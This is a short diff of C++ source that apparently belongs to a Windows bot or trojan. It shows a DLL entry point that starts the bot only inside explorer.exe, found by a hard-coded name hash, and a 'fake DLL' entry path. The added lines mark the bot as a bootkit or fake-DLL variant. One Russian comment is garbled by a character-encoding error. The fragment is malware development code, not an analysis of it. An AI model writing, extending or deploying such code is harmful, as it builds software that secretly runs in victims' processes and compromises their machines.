@@ -198,7 +198,10 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 			pGetModuleFileNameA( NULL, buf, MAX_PATH );
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
+			{
+				BOT::SetBotType(BotBootkit);
 				StartThread(ExplorerMain, NULL);
+			}
 			break;
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
@@ -216,6 +219,7 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
 	// ѕри загрузке просто вызывает Start, предусмотренную дл€
 	// обычного запуска Bot.plug
+	BOT::SetBotType(BotFakeDll);
 	Start(NULL, NULL, NULL);
 	return 0;
 }
